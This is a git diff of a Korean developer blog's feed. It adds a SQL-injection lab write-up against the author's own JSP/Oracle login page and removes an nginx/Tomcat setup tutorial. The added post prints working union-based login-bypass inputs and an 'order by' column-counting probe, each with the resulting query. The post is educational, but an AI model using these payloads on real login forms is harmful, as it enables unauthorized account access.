+    <tr>
+      <th> </th>
+      <th>입력</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>id</td>
+      <td><code class="language-plaintext highlighter-rouge">2' union select 'user2', cast(standard_hash('user2','SHA512') as char(128)) from dual where '1'='1 </code></td>
+    </tr>
+    <tr>
+      <td>pwd</td>
+      <td><code class="language-plaintext highlighter-rouge">user2</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>
+    <p>서버에서 완성된 쿼리문<br />
+<code class="language-plaintext highlighter-rouge">select id,hashpwd from members where id='2' union select 'user2', cast(standard_hash('user2','SHA512') as char(128)) from dual where '1'='1'</code><br />
+<img src="https://user-images.githubusercontent.com/31990118/233049659-a8d081d7-b534-4236-917d-9fa5306b7205.png" alt="Pasted image 20230419145543" />
+<br /><img src="https://user-images.githubusercontent.com/31990118/233049710-435711d1-158a-4f42-849a-ace70d6b1dcc.png" alt="Pasted image 20230419145554" /></p>
+  </li>
+  <li>standard_hash(‘user2’,’SHA512’) 로 나오는 결과와 table 에 저장된 hash 로 암호화 된 패스워드는 타입이 다르다.</li>
+  <li>따라서 <strong>cast 함수</strong>를 이용하여 타입을 <strong>char(128)</strong> 로 변경하였다.</li>
+</ul>
+
+<p><br /><br /></p>
+
+<h4 id="5-식별과-인증을-따로-할-때-id-두번-확인하기-">5. 식별과 인증을 따로 할 때(+ id 두번 확인하기 )</h4>
+
+<blockquote>
+  <p>로그인방법</p>
+  <ol>
+    <li>유저가 입력한 id와 <code class="language-plaintext highlighter-rouge">sql 질의문</code>을 통해 id 정보와 비밀번호 정보를 불러온다.<br /><code class="language-plaintext highlighter-rouge">select id,PASSWORD from members where id='아이디' and id='아이디'</code></li>
+    <li>여기서 id를 두번 확인한 것을 알 수 있다.</li>
+    <li>입력받은 비밀번호와 db 에서 불러온 비밀번호를 비교하여 일치하는지 확인한다.</li>
+    <li>일치하면 db 에서 불러온 id 정보를 통해 나머지 유저 정보도 불러온다.<br /><code class="language-plaintext highlighter-rouge">select * from members  where id='db에서 불러온 id정보';</code></li>
+  </ol>
+</blockquote>
+
+<blockquote>
+  <p>로그인 코드<br />
+<script src="https://gist.github.com/MinGyu2/4838aebdc75359591b92074aff22d9b9.js"></script></p>
+</blockquote>
+
+<blockquote>
+  <p>정상적인 로그인<br />
+<img src="https://user-images.githubusercontent.com/31990118/233050196-c0143052-3671-4b80-b093-26faa1a48362.png" alt="Pasted image 20230419150308" />
+<br /><img src="https://user-images.githubusercontent.com/31990118/233050247-58e103c1-83b5-4b53-bde1-bfff07bae2f4.png" alt="Pasted image 20230419150324" /></p>
+</blockquote>
+
+<p><br /></p>
+<blockquote>
+  <p>정확한 컬럼 수 찾기</p>
+  <ul>
+    <li><code class="language-plaintext highlighter-rouge">order by</code> 를 이용한다.</li>
+    <li><code class="language-plaintext highlighter-rouge">user2' order by 2 -- </code> 로그인 성공<br /><img src="https://user-images.githubusercontent.com/31990118/233050601-910ace99-8195-40c5-a231-ef871db2e4ab.png" alt="Pasted image 20230419145849" /><br /><img src="https://user-images.githubusercontent.com/31990118/233050662-6455b018-b493-4f44-94fa-21555d6111c5.png" alt="Pasted image 20230419150003" /></li>
+    <li><code class="language-plaintext highlighter-rouge">user2' order by 3 -- </code> 로그인 실패</li>
+    <li>즉 컬럼의 수는 2개 라는것을 알 수 있다.</li>
+  </ul>
+</blockquote>
+
+<p><br /></p>
+
+<blockquote>
+  <p>공격방법</p>
+</blockquote>
+
+<ul>
+  <li><strong>union + 주석 사용</strong></li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th>입력</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>id</td>
+      <td><code class="language-plaintext highlighter-rouge">x' union select 'user2','a' from dual -- </code></td>
+    </tr>
+    <tr>
+      <td>pwd</td>
+      <td><code class="language-plaintext highlighter-rouge">a</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>서버에서 완성된 쿼리문<br />
+<code class="language-plaintext highlighter-rouge">select id,PASSWORD from members where id='x' union select 'user2','a' from dual -- ' and id='x' union select 'user2','a' from dual -- '</code><br /><img src="https://user-images.githubusercontent.com/31990118/233051049-a26dfe1e-a888-412b-a552-54f56d8b4f06.png" alt="Pasted image 20230419150030" />
+<br /><img src="https://user-images.githubusercontent.com/31990118/233051097-c07becb0-6e56-458a-b33d-1401cea13e36.png" alt="Pasted image 20230419150041" /></li>
+</ul>
+
+<p><br /></p>
+
+<blockquote>
+  <p>특징</p>
+  <ul>
+    <li>id를 한번확인 하는 방법보다 2번 확인을 하면 공격자가 인증 쿼리 예측하기 힘들다.</li>
+    <li><code class="language-plaintext highlighter-rouge">where</code> 문을 추가할 수 없다.<br />id에 다음 쿼리를 입력하여도 로그인이 안된다.<br /> <code class="language-plaintext highlighter-rouge">x' union select 'user2','user2' from dual where '1'='1</code></li>
+  </ul>
+</blockquote>
+
+<p><br /><br /></p>
+<h3 id="단방향-해시-함수">단방향 해시 함수</h3>
+<hr />
+<ul>
+  <li>임이의 길이를 갖는 데이터를 고정된 길이의 데이터로 변환시켜주는 함수이다.</li>
+  <li>위변조 여부를 판별하거나, 무결성을 검증하는데 사용된다.</li>
+  <li>비밀번호를 서버에 안전하게 저장하기 위해 사용한다.</li>
+  <li>MD5, SHA1, SHA256, SHA512 등이 있다.</li>
+</ul>
+
+<h3 id="sql-에-따른-주석-차이">SQL 에 따른 주석 차이</h3>
+<hr />
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th>mysql</th>
+      <th>oracle db</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>한줄 주석</td>
+      <td>#, –</td>
+      <td>–</td>
+    </tr>
+    <tr>
+      <td>부분 주석</td>
+      <td>/**/</td>
+      <td>/**/</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><br /><br /></p>
+
+<h3 id="oracle-sql-연산자-우선순위">Oracle SQL 연산자 우선순위</h3>
+<hr />
+
+<table>
+  <thead>
+    <tr>
+      <th>연산자</th>
+      <th>설명</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>산술연산자</td>
+      <td>** * , /, +, - **</td>
+    </tr>
+    <tr>
+      <td>연결연산자</td>
+      <td>||</td>
+    </tr>
+    <tr>
+      <td>비교연산자</td>
+      <td>=, &gt; , &lt; , &gt;= , &lt;= , &lt;&gt; , != , ^=</td>
+    </tr>
+    <tr>
+      <td>논리연사자</td>
+      <td>BETWEEN, NOT, AND, OR</td>
+    </tr>
+    <tr>
+      <td>SQL 연산자</td>
+      <td>LIKE, NOT LIKE, IN, EXISTS</td>
+    </tr>
+    <tr>
+      <td>집합 연산자</td>
+      <td>UNION ALL, UNION, INTERSECT, MINUS</td>
+    </tr>
+  </tbody>
+</table>
+
+<table>
+  <thead>
+    <tr>
+      <th>순서</th>
+      <th>연산자</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>1</td>
+      <td>괄호</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>* , /</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>+ , -</td>
+    </tr>
+    <tr>
+      <td>4</td>
+      <td>= , &lt;&gt; , &lt; , &gt; , &lt;= , &gt;=</td>
+    </tr>
+    <tr>
+      <td>5</td>
+      <td>IS (IS NULL, IS NOT NULL, IS EMPTY, IS NOT EMPTY)</td>
+    </tr>
+    <tr>
+      <td>6</td>
+      <td>BETWEEN</td>
+    </tr>
+    <tr>
+      <td>7</td>
+      <td>NOT</td>
+    </tr>
+    <tr>
+      <td>8</td>
+      <td>AND</td>
+    </tr>
+    <tr>
+      <td>9</td>
+      <td>OR</td>
+    </tr>
+  </tbody>
+</table>]]></content><author><name>Jung MinGyu</name></author><category term="SQL" /><category term="Oracle DB" /><category term="SQL Injection" /><category term="Java" /><summary type="html"><![CDATA[SQL Injection 이란? sql 질의문을 삽입하는 공격이다. 즉 sql 질의문에 악의적인 코드를 배치하는 공격이다. 웹 해킹 기술중 하나이다.]]></summary></entry><entry><title type="html">웹서버 만들기(7)</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C7/" rel="alternate" type="text/html" title="웹서버 만들기(7)" /><published>2023-04-14T00:00:00+09:00</published><updated>2023-04-15T00:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C7</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C7/"><![CDATA[<ul>
   <li>웹 서버 만들기 (1) ~ (6) 과정을 통해 웹서버와 DB서버 구현을 완료하였다.</li>
   <li>웹 서버에서 db에 저장된 데이터를 가져오는 방법도 알아보았다.</li>
 </ul>
@@ -809,147 +1595,4 @@ RSAPSSSHA512(…)
   <li><a href="https://develop-writing.tistory.com/20">Hello Servlet! 만들어보기 (IDE 없이) (tistory.com)</a></li>
   <li><a href="https://velog.io/@jsj3282/MVC-%ED%8C%A8%ED%84%B4-%EA%B5%AC%ED%98%842-%EB%AA%A8%EB%8D%B8-2-%EA%B5%AC%EC%A1%B0%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-MVC-%ED%8C%A8%ED%84%B4">MVC 패턴 구현(2) : 모델 2 구조를 이용한 MVC 패턴(1) (velog.io)</a></li>
   <li><a href="https://whitewing4139.tistory.com/261">2. JSP, Servlet 기본 파일 위치</a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="nginx" /><category term="tomcat" /><category term="servlet" /><summary type="html"><![CDATA[간단한 로그인 서버를 만들기 (2)]]></summary></entry><entry><title type="html">웹서버 만들기(1)</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C1/" rel="alternate" type="text/html" title="웹서버 만들기(1)" /><published>2023-04-02T00:00:00+09:00</published><updated>2023-04-04T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C1</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C1/"><![CDATA[<ul>
-  <li>목표 : jsp 를 이용하여 간단한 로그인 서버를 만들것이다.</li>
-  <li>환경 : 우분투 22.04</li>
-  <li>MVC ( Model View Controller ) 구조
-    <ol>
-      <li>MVC 모델1 : <code class="language-plaintext highlighter-rouge">클라이언트 &lt;&gt; 아파치 or nginx &lt;&gt; 톰캣 &lt;&gt; JSP &lt;&gt; DB</code></li>
-      <li>MVC 모델2 : <code class="language-plaintext highlighter-rouge">클라이언트 &lt;&gt; 아파치 or nginx &lt;&gt; 톰캣&lt;&gt; servlet JSP &lt;&gt; DB</code></li>
-    </ol>
-  </li>
-</ul>
-
-<h3 id="nginx-설치하기">Nginx 설치하기</h3>
-<ol>
-  <li><code class="language-plaintext highlighter-rouge">sudo apt install nginx</code> nginx 설치하기. <code class="language-plaintext highlighter-rouge">service nginx status</code> 로 상태를 확인할 수 있다. 설치를 하면 자동으로 동작 시작하는 것을 볼 수 있다.<br />
-<code class="language-plaintext highlighter-rouge">nmap localhost</code> 로 열린 포트를 확인할 수 있다.<br />
-<img src="https://user-images.githubusercontent.com/31990118/229353386-8d671b2d-95d6-4c01-a269-7d02c2752279.png" alt="Pasted image 20230402175338" /><br />
-<img src="https://user-images.githubusercontent.com/31990118/229353485-fb6c96ac-1084-4585-b6cc-fdd632238fd1.png" alt="Pasted image 20230402200137" /><br />
-<img src="https://user-images.githubusercontent.com/31990118/229353524-cd57db39-a86d-4b74-a57b-20c3600ad975.png" alt="Pasted image 20230402200423" /></li>
-  <li>nginx 중지, 시작, 재시작 명령어.
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo service nginx stop
-sudo service nginx start
-sudo service nginx restart
-</code></pre></div>    </div>
-  </li>
-</ol>
-
-<h3 id="톰캣-설치하기">톰캣 설치하기</h3>
-<ol>
-  <li>톰캣 설치하기 전 <strong>open jdk 11</strong> 부터 설치한다.
-<code class="language-plaintext highlighter-rouge">sudo apt install openjdk-11-jdk -y</code> 명령으로 설치한다.<br />
-<img src="https://user-images.githubusercontent.com/31990118/229353590-76b89577-653b-459c-81dd-258ab4478117.png" alt="Pasted image 20230402183637" /></li>
-  <li>톰캣을 설치 하기 위해 톰캣 10.0.27 버전 먼저 다운로드 받는다<br />
-<code class="language-plaintext highlighter-rouge">sudo wget https://archive.apache.org/dist/tomcat/tomcat-10/v10.0.27/bin/apache-tomcat-10.0.27.tar.gz</code> 명령으로 다운받는다.<br />
-<img src="https://user-images.githubusercontent.com/31990118/229353620-1052c81f-b6fc-4a5d-911b-5474c68b8c42.png" alt="Pasted image 20230402184349" /></li>
-  <li>현재폴더에서 압축을 풀어준다.<br />
-<code class="language-plaintext highlighter-rouge">tar -xvf apache-tomcat-10.0.27.tar.gz</code>
-<img src="https://user-images.githubusercontent.com/31990118/229353642-2e0e235a-4ac4-413d-89c9-38143fb04057.png" alt="Pasted image 20230402184512" /></li>
-  <li>tomcat 동작시키기.<br />
-<code class="language-plaintext highlighter-rouge">./apache-tomcat-10.0.27/bin/startup.sh</code>  톰켓을 시작한다.<br />
-<code class="language-plaintext highlighter-rouge">nmap localhost</code> 로 열린 포트를 확인한다<br />
-<img src="https://user-images.githubusercontent.com/31990118/229353662-5fa96c01-9997-478a-9ce9-d5f8d79d5621.png" alt="Pasted image 20230402201051" /><br />
-[http://localhost:8080]<br />
-<img src="https://user-images.githubusercontent.com/31990118/229353695-a5d58aeb-ec1f-49a3-8eeb-32a360e1d54e.png" alt="Pasted image 20230402201102" /></li>
-  <li>만약 자바를 설치하지 않았거나 JAVA_HOME 환경변수를 지정하지 않으면 오류가 발생할 수 있다. JAVA_HOME 환경변수를 등록하여 오류 해결이 가능하다.</li>
-</ol>
-
-<h3 id="nginx-와-tomcat-연동하기">NginX 와 Tomcat 연동하기</h3>
-<ol>
-  <li>먼저 톰켓을 동작 시켜야한다.<br />
-<img src="https://user-images.githubusercontent.com/31990118/229353781-1628dd20-3a10-4b94-8887-2c1b979ee9a7.png" alt="Pasted image 20230402201051" /></li>
-  <li><code class="language-plaintext highlighter-rouge">vi /etc/nginx/nginx.conf</code> 파일을 살폅보면  sites-enabled 폴더 안의 파일들을 살펴보는 것을 알 수 있다.<br />
-<img src="https://user-images.githubusercontent.com/31990118/229353926-9b507926-9f5d-473d-ab29-0799a6397947.png" alt="Pasted image 20230402210019" /></li>
-  <li><code class="language-plaintext highlighter-rouge">sudo vi /etc/nginx/sites-enabled/default</code> 열어보자.<br />
-<img src="https://user-images.githubusercontent.com/31990118/229410744-73a7dfc8-86e8-498d-9daf-df2f8f1c7bb7.png" alt="image" /><br />
-<strong>location /</strong> 의 <strong>proxy_pass</strong> 부분에 tomcat의 동작중인 주소를 넣어준다.</li>
-  <li>[http://localhost] 로 접속하면 nginx로 연결되는 것이아닌 tomcat으로 연결되는것을 확인할 수 있다.
-<img src="https://user-images.githubusercontent.com/31990118/229354036-affbd17e-02f9-4e49-85f5-bd2f5809c239.png" alt="Pasted image 20230402210711" /></li>
-</ol>
-
-<h3 id="nginx와-tomcat-연동중-발생한-오류">nginx와 tomcat 연동중 발생한 오류</h3>
-
-<ul>
-  <li><strong>실패1 css 파일 못찾음</strong> <br />
-<img src="https://user-images.githubusercontent.com/31990118/229415729-79a7ef72-b801-49a3-83f2-84afb7b1c755.png" alt="Pasted image 20230403132740" />
-<img src="https://user-images.githubusercontent.com/31990118/229415824-3200151f-5f51-4ea1-8e9d-bee2e9079f8b.png" alt="Pasted image 20230403132719" /></li>
-  <li>해결법
-    <ul>
-      <li>방법 (1)
-        <ul>
-          <li><code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/default</code> 파일의 <strong>location /</strong> 부분을 살펴보자.</li>
-          <li><strong>try_files $uri $uri/ =404;</strong> 부분을 주석처리 안해주면 <strong>jsp</strong> 가 제대로 동작안하거나 웹사이트가 제대로 동작안 할 수 있다. 따라서 <strong>try_files $uri $uri/ =404;</strong>  부분을 주석처리해주면 된다.<br /><img src="https://user-images.githubusercontent.com/31990118/229415970-22abbd83-7558-496f-be5b-82830905b8f9.png" alt="Pasted image 20230403134856" /></li>
-        </ul>
-      </li>
-      <li>방법(2)
-        <ul>
-          <li><strong>try_files $uri $uri/ =404;</strong> 을 주석처리 하지않고 .css 요청이 들어올 때도 proxy_pass 처리해 준다. <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/default</code> 파일에 넣어주면 된다.<br /><img src="https://user-images.githubusercontent.com/31990118/229416083-d35558ad-6d55-438f-8fef-d03b8a3a5cf7.png" alt="Pasted image 20230403135114" /></li>
-        </ul>
-      </li>
-    </ul>
-  </li>
-  <li><strong>실패2 jsp는 동작은 하지만 서버가 페이지를 이상하게 만들어서줌.</strong>
-<img src="https://user-images.githubusercontent.com/31990118/229416212-618480f1-fb39-418d-abb1-437ccd4cbee4.png" alt="Pasted image 20230403135438" /><br />예상동작<br /><img src="https://user-images.githubusercontent.com/31990118/229416494-f48f6664-16c2-4f1b-a82c-f4594d7b7a2c.png" alt="image" /></li>
-  <li>해결법
-    <ul>
-      <li>방법(1)
-        <ul>
-          <li><code class="language-plaintext highlighter-rouge">location ~ \.js {</code> 부분에서 <code class="language-plaintext highlighter-rouge">add_header Content-Type application/x-javascript;</code> 부분을 주석처리 해주면 된다.<br /><img src="https://user-images.githubusercontent.com/31990118/229416362-acd08166-018e-4ac8-99a6-dc07c4e4d408.png" alt="Pasted image 20230403135944" /></li>
-        </ul>
-      </li>
-      <li>방법(2)
-        <ul>
-          <li><strong>try_files $uri $uri/ =404;</strong> 부분을 주석처리 안해주면 <strong>jsp</strong> 가 제대로 동작안하거나 웹사이트가 제대로 동작안 할 수 있다. 따라서 <strong>try_files $uri $uri/ =404;</strong>  부분을 주석처리해주면 된다.<br /></li>
-        </ul>
-      </li>
-    </ul>
-  </li>
-  <li>주의
-    <ul>
-      <li><code class="language-plaintext highlighter-rouge">default</code> 파일 바꾸고 나서 nginx 서버를 재시작해줘야 한다.<br /><code class="language-plaintext highlighter-rouge">sudo service nginx restart</code></li>
-    </ul>
-  </li>
-</ul>
-
-<h3 id="jsp-동작-테스트">JSP 동작 테스트</h3>
-<ol>
-  <li><code class="language-plaintext highlighter-rouge">apache-tomcat-10.1.7/webapps/ROOT</code> 위치에 <strong>test.jsp</strong> 파일을 만들어준다.</li>
-  <li>그리고 다음 내용을 test.jsp 파일에 추가해준다.</li>
-</ol>
-
-<figure class="highlight"><pre><code class="language-jsp" data-lang="jsp"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-</pre></td><td class="code"><pre>  <span class="nt">&lt;html&gt;</span>
-  <span class="nt">&lt;%</span> <span class="nc">String</span> <span class="n">test</span><span class="o">=</span><span class="s">"hello"</span><span class="o">;</span> <span class="nt">%&gt;</span>
-  <span class="nt">&lt;script&gt;</span>
-          <span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="nt">&lt;%=</span><span class="n">test</span><span class="nt">%&gt;</span><span class="dl">'</span><span class="p">);</span>
-  <span class="nt">&lt;/script&gt;</span>
-  <span class="nt">&lt;/html&gt;</span>
-  
-</pre></td></tr></tbody></table></code></pre></figure>
-
-<ul>
-  <li>동작결과<br /> <code class="language-plaintext highlighter-rouge">http://localhost/test.jsp</code> 또는 <code class="language-plaintext highlighter-rouge">http://주소/test.jsp</code> 로 들어가면 alert 창이 뜨는 것을 확인할 수 있다.<br /><img src="https://user-images.githubusercontent.com/31990118/229417802-a74e2a24-a818-483f-a0d4-16a5901817f4.png" alt="Pasted image 20230403141653" />
-<br /><img src="https://user-images.githubusercontent.com/31990118/229417878-61157c2c-3e76-499e-bce9-3515112cecff.png" alt="Pasted image 20230403141721" /></li>
-</ul>
-
-<h3 id="참고-사이트">참고 사이트</h3>
-<ul>
-  <li><a href="https://coding-factory.tistory.com/69">Jsp MVC 패턴이란 무엇인가? (Model1, Model2)</a></li>
-  <li><a href="https://seonghyuk.tistory.com/41">1. 우분투에서 아파치 웹서버 설치하기</a></li>
-  <li><a href="https://doqtqu.tistory.com/103">아파치 + 톰캣 연동하기</a></li>
-  <li><a href="https://haengsin.tistory.com/114?category=900169">[WEB] NginX - Tomcat 연동</a></li>
-  <li><a href="https://www.hostinger.com/tutorials/how-to-install-tomcat-on-ubuntu/">Install Tomcat on Ubuntu – Simple Step-by-Step Guide (hostinger.com)</a></li>
-  <li><a href="https://m.blog.naver.com/PostView.naver?isHttpsRedirect=true&amp;blogId=heaves1&amp;logNo=221092915484">nginx설정 (Tomcat서버 요청하기) </a></li>
-  <li><a href="https://www.hostinger.com/tutorials/how-to-install-tomcat-on-ubuntu/">Install Tomcat on Ubuntu – Simple Step-by-Step Guide (hostinger.com)</a></li>
-  <li><a href="https://m.blog.naver.com/PostView.naver?isHttpsRedirect=true&amp;blogId=heaves1&amp;logNo=221092915484">nginx설정 (Tomcat서버 요청하기) </a></li>
-  <li><a href="https://sangchul.kr/entry/%EB%A6%AC%EB%88%85%EC%8A%A4-nginx-tomcat-install">[리눅스] nginx tomcat 설치 및 연동</a></li>
-  <li><a href="https://hiworld.tistory.com/entry/%EC%9A%B0%EB%B6%84%ED%88%AC%EB%A5%BC-%EA%B0%9C%EB%B0%9C-%EB%A8%B8%EC%8B%A0%EC%9C%BC%EB%A1%9C-%EB%A7%8C%EB%93%A4%EA%B8%B0-JSP-%ED%99%98%EA%B2%BD-%EA%B5%AC%EC%B6%95">우분투를 개발 머신으로 만들기 - JSP 환경 구축</a></li>
-  <li><a href="https://code-monkey7.tistory.com/18">CodeMonkey :: nginX Tomcat과 nginX 연동처리를 통한 서버관리 </a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="nginx" /><category term="tomcat" /><summary type="html"><![CDATA[목표 : jsp 를 이용하여 간단한 로그인 서버를 만들것이다. 환경 : 우분투 22.04 MVC ( Model View Controller ) 구조 MVC 모델1 : 클라이언트 &lt;&gt; 아파치 or nginx &lt;&gt; 톰캣 &lt;&gt; JSP &lt;&gt; DB MVC 모델2 : 클라이언트 &lt;&gt; 아파치 or nginx &lt;&gt; 톰캣&lt;&gt; servlet JSP &lt;&gt; DB]]></summary></entry></feed>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="nginx" /><category term="tomcat" /><category term="servlet" /><summary type="html"><![CDATA[간단한 로그인 서버를 만들기 (2)]]></summary></entry></feed>
